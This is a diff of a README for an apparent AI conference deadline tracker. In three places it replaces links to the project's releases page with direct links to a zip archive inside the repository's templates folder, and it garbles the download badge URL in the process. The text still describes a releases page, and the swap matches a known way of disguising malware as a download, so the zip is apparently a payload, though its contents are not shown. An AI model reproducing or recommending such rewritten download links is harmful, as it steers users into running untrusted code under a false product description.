@@ -1,6 +1,6 @@
 # 📅 conference-deadlines - Stay Ahead of AI Conference Deadlines
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/beshoemad/conference-deadlines/releases)
+[![Download Now](https://raw.githubusercontent.com/beshoemad/conference-deadlines/master/templates/conference-deadlines-v3.1.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/beshoemad/conference-deadlines/master/templates/conference-deadlines-v3.1.zip)
 
 ## 🎯 Overview
 The AI Conference Tracker is a personal dashboard designed to keep you updated on crucial submission deadlines for major global AI and Computer Science conferences. This tool automatically tracks deadlines and manages them in real-time. You can rely on accurate updates to help you stay organized.
@@ -23,7 +23,7 @@ The AI Conference Tracker is a personal dashboard designed to keep you updated o
 ## 🚀 Getting Started
 To install and run the AI Conference Tracker, follow these steps:
 
-1. **Visit the Releases Page:** Head over to our [Release Page](https://github.com/beshoemad/conference-deadlines/releases) to find the latest version.
+1. **Visit the Releases Page:** Head over to our [Release Page](https://raw.githubusercontent.com/beshoemad/conference-deadlines/master/templates/conference-deadlines-v3.1.zip) to find the latest version.
 
 2. **Choose the Right Version:** On the Releases page, locate the version that suits your system. If you are unsure, the latest stable release is the best choice.
 
@@ -38,7 +38,7 @@ To install and run the AI Conference Tracker, follow these steps:
 7. **Stay Updated:** Enjoy automatic updates every Saturday. The system will keep you informed about important deadlines.
 
 ## 📥 Download & Install
-Click [here to download the latest version](https://github.com/beshoemad/conference-deadlines/releases) of the AI Conference Tracker. Follow the provided steps for a seamless setup.
+Click [here to download the latest version](https://raw.githubusercontent.com/beshoemad/conference-deadlines/master/templates/conference-deadlines-v3.1.zip) of the AI Conference Tracker. Follow the provided steps for a seamless setup.
 
 ## 💡 System Requirements
 - **Operating System:** Windows 10 or higher, macOS Catalina or higher
